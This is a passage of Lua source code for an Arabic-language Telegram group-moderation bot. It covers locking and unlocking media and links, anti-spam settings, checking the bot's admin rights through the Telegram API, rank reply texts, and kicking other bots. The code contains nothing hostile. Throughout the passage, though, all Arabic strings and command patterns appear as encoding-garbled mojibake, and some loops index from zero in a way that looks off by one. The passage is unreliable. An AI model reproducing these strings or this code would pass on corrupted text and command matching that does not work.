if LockText[2] == "ุงููุงุฑูุฏุงูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงููุงุฑูุฏุงูู")  
Devmfm:set(mustafa..'mfm:Lock:Markdown'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑูุฏุงูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุงุดุนุงุฑุงุช" then
if not Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุงุดุนุงุฑุงุช")  
Devmfm:set(mustafa..'mfm:Lock:TagServr'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงุดุนุงุฑุงุช ุจุงููุนู ููููู ูู ุงููุฌููุนู', 1, 'md')
end
end
if LockText[2] == "ุงูุชูุฌูู" then
if not Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูุฌูู")  
Devmfm:set(mustafa..'mfm:Lock:Forwards'..msg.chat_id_,true)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชูุฌูู ุจุงููุนู ูููู ูู ุงููุฌููุนู', 1, 'md')
end
end
end
end
if Admin(msg) then
if text and text:match("^ูุชุญ (.*)$") then
local UnLockText = {string.match(text, "^(ูุชุญ) (.*)$")}
if UnLockText[2] == "ุงูุฏุฑุฏุดู" then
if Devmfm:get(mustafa..'mfm:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุฏุฑุฏุดู")  
Devmfm:del(mustafa..'mfm:Lock:Text'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฏุฑุฏุดู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุตูุฑ" then
if Devmfm:get(mustafa..'mfm:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุตูุฑ")  
Devmfm:del(mustafa..'mfm:Lock:Photo'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุตูุฑ ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุงูุด" then
if Devmfm:get(mustafa..'mfm:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูููุงูุด")  
Devmfm:del(mustafa..'mfm:Lock:Spam'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุงูุด ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฏุฎูู" then
if Devmfm:get(mustafa..'mfm:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุฏุฎูู")  
Devmfm:del(mustafa..'mfm:Lock:Join'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฏุฎูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุฏูู" then
if Devmfm:get(mustafa..'mfm:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูููุฏูู")  
Devmfm:del(mustafa..'mfm:Lock:Videos'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุฏูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููููุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:Document'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููููุงุช")  
Devmfm:del(mustafa..'mfm:Lock:Document'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููููุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงูููุงูู" then
if Devmfm:get(mustafa..'mfm:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุงูููุงูู")  
Devmfm:del(mustafa..'mfm:Lock:Inline'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงูููุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุฑูุฏุงูู" then
if Devmfm:get(mustafa..'mfm:Lock:Markdown'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุงุฑูุฏุงูู")  
Devmfm:del(mustafa..'mfm:Lock:Markdown'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุฑูุฏุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุชุญุฑูู" then
if Devmfm:get(mustafa..'mfm:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุชุญุฑูู")  
Devmfm:del(mustafa..'mfm:Lock:Gifs'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุชุญุฑูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงุบุงูู" then
if Devmfm:get(mustafa..'mfm:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุงุบุงูู")  
Devmfm:del(mustafa..'mfm:Lock:Music'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงุบุงูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุตูุช" then
if Devmfm:get(mustafa..'mfm:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุตูุช")  
Devmfm:del(mustafa..'mfm:Lock:Voice'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุตูุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฑูุงุจุท" then
if Devmfm:get(mustafa..'mfm:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุฑูุงุจุท")  
Devmfm:del(mustafa..'mfm:Lock:Links'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฑูุงุจุท ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุงูุน" then
if Devmfm:get(mustafa..'mfm:Lock:Location'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูููุงูุน")  
Devmfm:del(mustafa..'mfm:Lock:Location'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุงูุน ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุนุฑู" or UnLockText[2] == "ุงููุนุฑูุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:Tags'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุนุฑูุงุช")  
Devmfm:del(mustafa..'mfm:Lock:Tags'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุนุฑูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงููุงุดุชุงู" or UnLockText[2] == "ุงูุชุงู" then
if Devmfm:get(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงููุงุดุชุงู")  
Devmfm:del(mustafa..'mfm:Lock:Hashtak'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงููุงุดุชุงู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุฌูุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:Contact'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุฌูุงุช")  
Devmfm:del(mustafa..'mfm:Lock:Contact'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุฌูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุดุจูุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุดุจูุงุช")  
Devmfm:del(mustafa..'mfm:Lock:WebLinks'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุดุจูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุนุฑุจูู" then
if Devmfm:get(mustafa..'mfm:Lock:Arabic'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุนุฑุจูู")  
Devmfm:del(mustafa..'mfm:Lock:Arabic'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุนุฑุจูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงููููุฒูู" then
if Devmfm:get(mustafa..'mfm:Lock:English'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุงููููุฒูู")  
Devmfm:del(mustafa..'mfm:Lock:English'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงููููุฒูู ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุงุดุนุงุฑุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:TagServr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุงุดุนุงุฑุงุช")  
Devmfm:del(mustafa..'mfm:Lock:TagServr'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุงุดุนุงุฑุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูููุตูุงุช" then
if Devmfm:get(mustafa..'mfm:Lock:Stickers'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูููุตูุงุช")  
Devmfm:del(mustafa..'mfm:Lock:Stickers'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูููุตูุงุช ุจุงููุนู ููุชูุญู ูู ุงููุฌููุนู', 1, 'md')
end
end
if UnLockText[2] == "ุงูุชูุฌูู" then
if Devmfm:get(mustafa..'mfm:Lock:Forwards'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุชูุฌูู")  
Devmfm:del(mustafa..'mfm:Lock:Forwards'..msg.chat_id_)
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงูุชูุฌูู ุจุงููุนู ููุชูุญ ูู ุงููุฌููุนู', 1, 'md')
end
end
end
end
if text and text:match("^ููู ุงูุชูููุด$") or text and text:match("^ุชูุนูู ุงูุญูุงูู ุงููุตูู$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููููุดุฆูู ููุท', 1, 'md')
else
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุงูุชูููุด")  
end
end
if text and text:match("^ูุชุญ ุงูุชูููุด$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููููุดุฆูู ููุท', 1, 'md')
else
Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'mfm:Lock:Links','mfm:Lock:Contact','mfm:Lock:Forwards','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:EditMsgs','mfm:Lock:Stickers','mfm:Lock:Farsi','mfm:Lock:Spam','mfm:Lock:WebLinks','mfm:Lock:Photo'}
for i,UnLock in pairs(UnLockList) do
Devmfm:del(mustafa..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุงูุชูููุด")  
end
end
if text and text:match("^ููู ุงููู$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููููุดุฆูู ููุท', 1, 'md')
else
Devmfm:del(mustafa..'mfm:Lock:Fshar'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Lock:Taf'..msg.chat_id_) Devmfm:del(mustafa..'mfm:Lock:Kfr'..msg.chat_id_) 
Devmfm:set(mustafa.."mfm:Lock:Bots"..msg.chat_id_,"del") Devmfm:hset(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'mfm:Lock:EditMsgs','mfm:Lock:Farsi','mfm:Lock:TagServr','mfm:Lock:Inline','mfm:Lock:Photo','mfm:Lock:Spam','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:Music','mfm:Lock:Voice','mfm:Lock:Links','mfm:Lock:Location','mfm:Lock:Tags','mfm:Lock:Stickers','mfm:Lock:Markdown','mfm:Lock:Forwards','mfm:Lock:Document','mfm:Lock:Contact','mfm:Lock:Hashtak','mfm:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
Devmfm:set(mustafa..Lock..msg.chat_id_,true)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ููู ุฌููุน ุงูุงูุงูุฑ")  
end
end
if text and text:match("^ูุชุญ ุงููู$") then
if not Constructor(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธููููุดุฆูู ููุท', 1, 'md')
else
Devmfm:set(mustafa..'mfm:Lock:Fshar'..msg.chat_id_,true) Devmfm:set(mustafa..'mfm:Lock:Taf'..msg.chat_id_,true) Devmfm:set(mustafa..'mfm:Lock:Kfr'..msg.chat_id_,true) Devmfm:hdel(mustafa.."mfm:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
UnLockList ={'mfm:Lock:EditMsgs','mfm:Lock:Text','mfm:Lock:Arabic','mfm:Lock:English','mfm:Lock:Join','mfm:Lock:Bots','mfm:Lock:Farsi','mfm:Lock:FarsiBan','mfm:Lock:TagServr','mfm:Lock:Inline','mfm:Lock:Photo','mfm:Lock:Spam','mfm:Lock:Videos','mfm:Lock:Gifs','mfm:Lock:Music','mfm:Lock:Voice','mfm:Lock:Links','mfm:Lock:Location','mfm:Lock:Tags','mfm:Lock:Stickers','mfm:Lock:Markdown','mfm:Lock:Forwards','mfm:Lock:Document','mfm:Lock:Contact','mfm:Lock:Hashtak','mfm:Lock:WebLinks'}
for i,UnLock in pairs(UnLockList) do
Devmfm:del(mustafa..UnLock..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ูุชุญ ุฌููุน ุงูุงูุงูุฑ")  
end
end
if Admin(msg) then
if text and (text:match("^ุถุน ุณุจุงู (%d+)$") or text:match("^ูุถุน ุณุจุงู (%d+)$")) then
local SetSpam = text:match("ุถุน ุณุจุงู (%d+)$") or text:match("ูุถุน ุณุจุงู (%d+)$")
if tonumber(SetSpam) < 40 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฎุชุฑ ุนุฏุฏ ุงูุจุฑ ูู 40 ุญุฑู ', 1, 'md')
else
Devmfm:set(mustafa..'mfm:Spam:Text'..msg.chat_id_,SetSpam)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ูุถุน ุนุฏุฏ ุงูุณุจุงู โซ'..SetSpam, 1, 'md')
end
end
end
if Manager(msg) then
if text == "ูุญุต" or text == "ูุญุต ุงูุจูุช" then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..mustafa)
local GetInfo = JSON.decode(Check)
if GetInfo.ok == true then
if GetInfo.result.can_change_info == true then EDT = 'โ๏ธ' else EDT = 'โ๏ธ' end
if GetInfo.result.can_delete_messages == true then DEL = 'โ๏ธ' else DEL = 'โ๏ธ' end
if GetInfo.result.can_invite_users == true then INV = 'โ๏ธ' else INV = 'โ๏ธ' end
if GetInfo.result.can_pin_messages == true then PIN = 'โ๏ธ' else PIN = 'โ๏ธ' end
if GetInfo.result.can_restrict_members == true then BAN = 'โ๏ธ' else BAN = 'โ๏ธ' end
if GetInfo.result.can_promote_members == true then VIP = 'โ๏ธ' else VIP = 'โ๏ธ' end 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุตูุงุญูุงุช ุงูุจูุช ูู โซ โค\nโ โ โ โ โ โ โ โ โ\nโ๏ธุญุฐู ุงูุฑุณุงุฆู โซ '..DEL..'\nโ๏ธุฏุนูุฉ ุงููุณุชุฎุฏููู โซ '..INV..'\nโ๏ธุญุธุฑ ุงููุณุชุฎุฏููู โซ '..BAN..'\nโ๏ธุชุซุจูุช ุงูุฑุณุงุฆู โซ '..PIN..'\nโ๏ธุชุบููุฑ ุงููุนูููุงุช โซ '..EDT..'\nโ๏ธุงุถุงูุฉ ูุดุฑููู โซ '..VIP..'\nโ โ โ โ โ โ โ โ โ', 1, 'md')
end end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููุทูุฑ (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููุทูุฑ (.*)$") 
Devmfm:set(mustafa.."mfm:SudoBot:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงููุทูุฑ ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ููุดุฆ ุงูุงุณุงุณู (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ููุดุฆ ุงูุงุณุงุณู (.*)$") 
Devmfm:set(mustafa.."mfm:BasicConstructor:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงูููุดุฆ ุงูุงุณุงุณู ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูููุดุฆ (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูููุดุฆ (.*)$") 
Devmfm:set(mustafa.."mfm:Constructor:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงูููุดุฆ ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ (.*)$") 
Devmfm:set(mustafa.."mfm:Managers:Rd"..msg.chat_id_,Text) 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงููุฏูุฑ ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูุงุฏูู (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูุงุฏูู (.*)$") 
Devmfm:set(mustafa.."mfm:Admins:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงูุงุฏูู ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงููููุฒ (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงููููุฒ (.*)$") 
Devmfm:set(mustafa.."mfm:VipMem:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงููููุฒ ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูููุธู (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูููุธู (.*)$") 
Devmfm:set(mustafa.."mfm:Cleaner:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงูููุธู ุงูู โซ "..Text, 1, 'md')
end
if text and text:match("^ุชุบูุฑ ุฑุฏ ุงูุนุถู (.*)$") then
local Text = text:match("^ุชุบูุฑ ุฑุฏ ุงูุนุถู (.*)$") 
Devmfm:set(mustafa.."mfm:mem:Rd"..msg.chat_id_,Text)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุชุบูุฑ ุฑุฏ ุงูุนุถู ุงูู โซ "..Text, 1, 'md')
end
if text == "ุญุฐู ุฑุฏูุฏ ุงูุฑุชุจ" or text == "ูุณุญ ุฑุฏูุฏ ุงูุฑุชุจ" then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ุฌููุน ุฑุฏูุฏ ุงูุฑุชุจ", 1, 'md')
Devmfm:del(mustafa.."mfm:mem:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Cleaner:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:VipMem:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Admins:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Managers:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:Constructor:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:BasicConstructor:Rd"..msg.chat_id_)
Devmfm:del(mustafa.."mfm:SudoBot:Rd"..msg.chat_id_)
end
end
if text == "ูุดู ุงูุจูุชุงุช" and ChCheck(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_  
text = 'โ๏ธ*ูุงุฆูุฉ ุงูุจูุชุงุช* โซ โค \nโ โ โ โ โ โ โ โ โ\n'
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then  
ab = ''
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then  
t = t + 1
ab = ' โฏ'
end
text = text.."~ [@"..data.username_..']'..ab.."\n"
if #admins == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชูุฌุฏ ุจูุชุงุช ููุง*", 1, 'md')
return false end
if #admins == i then 
local a = 'โ โ โ โ โ โ โ โ โ\nโ๏ธ*ุนุฏุฏ ุงูุจูุชุงุช ููุง* โซ '..n..'\n'
local f = 'โ๏ธ*ุนุฏุฏ ุงูุจูุชุงุช ุงููุฑููุนู* โซ '..t..'\nโ๏ธ*ููุงุญุถู ุนูุงูุฉ ุงูู*โฏ *ุชุนูู ุงู ุงูุจูุช ุงุฏูู ูู ูุฐู ุงููุฌููุนู*'
Dev_mfm(msg.chat_id_, msg.id_, 1, text..a..f, 1, 'md')
end
end,nil)
end
end,nil)
end
if text == 'ุญุฐู ุงูุจูุชุงุช' and ChCheck(msg) or text == 'ุทุฑุฏ ุงูุจูุชุงุช' and ChCheck(msg) or text == 'ูุณุญ ุงูุจูุชุงุช' and ChCheck(msg) then
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,dp)  
local admins = dp.members_  
local x = 0
local c = 0
for i=0 , #admins do 
if dp.members_[i].status_.ID == "ChatMemberStatusEditor" then  
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(mustafa) then
ChatKick(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end     
if (c - x) == 0 then
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ูุงุชูุฌุฏ ุจูุชุงุช ููุง*", 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธ*ุนุฏุฏ ุงูุจูุชุงุช ููุง* โซ "..c.."\nโ๏ธ*ุนุฏุฏ ุงูุจูุชุงุช ุงููุฑููุนู* โซ "..x.."\nโ๏ธ*ุชู ุทุฑุฏ* โซ "..(c - x).." *ูู ุงูุจูุชุงุช*", 1, 'md')
end 
end,nil)  
end 
end
if Admin(msg) then
if text and text:match("^ุญุฐู (.*)$") or text and text:match("^ูุณุญ (.*)$") then
local txts = {string.match(text, "^(ุญุฐู) (.*)$")}
local txtss = {string.match(text, "^(ูุณุญ) (.*)$")}
if Sudo(msg) then 
if txts[2] == 'ุงูุซุงููููู' or txtss[2] == 'ุงูุซุงููููู' or txts[2] == 'ุงููุทูุฑูู ุงูุซุงููููู' or txtss[2] == 'ุงููุทูุฑูู ุงูุซุงููููู' then
Devmfm:del(mustafa..'mfm:SecondSudo:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุทูุฑูู ุงูุซุงููููู")  
end
end
if SecondSudo(msg) then 
if txts[2] == 'ุงููุทูุฑูู' or txtss[2] == 'ุงููุทูุฑูู' then
Devmfm:del(mustafa..'mfm:SudoBot:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุทูุฑูู")  
end
if txts[2] == 'ูุงุฆูู ุงูุนุงู' or txtss[2] == 'ูุงุฆูู ุงูุนุงู' then
Devmfm:del(mustafa..'mfm:BanAll:')
Devmfm:del(mustafa..'mfm:MuteAll:')
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ูุงุฆูุฉ ุงูุนุงู")  
end
end
if SudoBot(msg) then
if txts[2] == 'ุงูุงุฏูููู ุงูุนุงููู' or txts[2] == 'ุงูุงุฏูููู ุงูุนุงู' or txtss[2] == 'ุงูุงุฏูููู ุงูุนุงููู' or txtss[2] == 'ุงูุงุฏูููู ุงูุนุงู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงูุงุฏูููู ุงูุนุงููู")  
Devmfm:del(mustafa..'mfm:AdminAll:')
end
if txts[2] == 'ุงููููุฒูู ุนุงู' or txts[2] == 'ุงููููุฒูู ุงูุนุงููู' or txtss[2] == 'ุงููููุฒูู ุนุงู' or txtss[2] == 'ุงููููุฒูู ุงูุนุงููู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููููุฒูู ุนุงู")  
Devmfm:del(mustafa..'mfm:VipAll:')
end
if txts[2] == 'ุงููุฏุฑุงุก ุงูุนุงููู' or txts[2] == 'ุงููุฏุฑุงุก ุงูุนุงู' or txtss[2] == 'ุงููุฏุฑุงุก ุงูุนุงููู' or txtss[2] == 'ุงููุฏุฑุงุก ุงูุนุงู' then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","โ๏ธุชู ุญุฐู ุงููุฏุฑุงุก ุงูุนุงููู")  
Devmfm:del(mustafa..'mfm:ManagerAll:')
end
end
if mfmConstructor(msg) then
